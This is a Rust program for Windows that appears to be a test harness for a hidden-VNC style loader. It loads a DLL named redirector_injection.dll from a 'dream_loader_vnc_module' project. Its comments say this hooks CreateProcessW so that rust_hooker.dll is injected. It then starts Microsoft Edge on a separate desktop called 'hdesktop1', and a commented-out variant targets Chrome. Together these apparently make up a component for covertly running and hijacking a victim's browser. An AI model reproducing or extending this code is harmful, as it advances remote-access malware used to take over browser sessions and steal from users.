#![allow(non_snake_case)]
#![allow(non_camel_case_types)]

use std::{thread::sleep, time::Duration};
use windows_sys::{
    Win32::{
        Foundation::{CloseHandle, GetLastError},
        System::{
            LibraryLoader::LoadLibraryW,
            Threading::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW, INFINITE, WaitForSingleObject},
        },
    },
    core::*,
};

/// Helper function to print the last Windows error
fn print_last_error(context: Option<String>) {
    unsafe {
        let error = GetLastError();
        if let Some(ctx) = context {
            println!("[{}] Last error: {}", ctx, error);
        } else {
            println!("Last error: {}", error);
        }
    }
}

fn main() {
    unsafe {
        let status = LoadLibraryW(w!(r"C:\Users\user\source\repos\dream_loader\dream_loader_vnc_module\target\debug\redirector_injection.dll"));
        println!("{:x}",status as usize);
        sleep(Duration::from_secs(5));

            // Launch msedge.exe using CreateProcessW
            // This will trigger the CreateProcessW hook which injects rust_hooker.dll
            println!("\n========================================");
            println!("  LAUNCHING MSEDGE WITH HOOK INJECTION");
            println!("========================================\n");
            
            let application_path = w!(r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe");
            let mut cmd = w!("msedge.exe") as *mut u16;
            //let application_path = w!(r"C:\Program Files\Google\Chrome\Application\chrome.exe");
            //let mut cmd = w!("chrome.exe --allow-third-party-modules") as *mut u16;
            let mut startup_info: STARTUPINFOW = std::mem::zeroed();
            startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            
            
            let mut desktop_name:Vec<u16> = "hdesktop1".encode_utf16().collect();
            desktop_name.push(0);
            startup_info.lpDesktop = desktop_name.as_mut_ptr();
            

            let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
            
            let result = CreateProcessW(
                application_path,           // lpApplicationName
                cmd,       // lpCommandLine (could add args here)
                std::ptr::null(),           // lpProcessAttributes
                std::ptr::null(),           // lpThreadAttributes
                0,                          // bInheritHandles = FALSE
                0,                          // dwCreationFlags
                std::ptr::null(),           // lpEnvironment
                std::ptr::null(),           // lpCurrentDirectory
                &startup_info,              // lpStartupInfo
                &mut process_info,          // lpProcessInformation
            );
            
            if result != 0 {
                println!("✓ CreateProcessW succeeded!");
                println!("  Process ID: {}", process_info.dwProcessId);
                println!("  Thread ID:  {}", process_info.dwThreadId);
                println!("\nWaiting for Edge process to exit (or press Ctrl+C)...");
                
                // Wait for the process to exit
                WaitForSingleObject(process_info.hProcess, INFINITE);
                
                // Cleanup handles
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);
                
                println!("Edge process exited.");
            } else {
                print_last_error(Some(String::from("CreateProcessW msedge.exe")));
            }
    }
}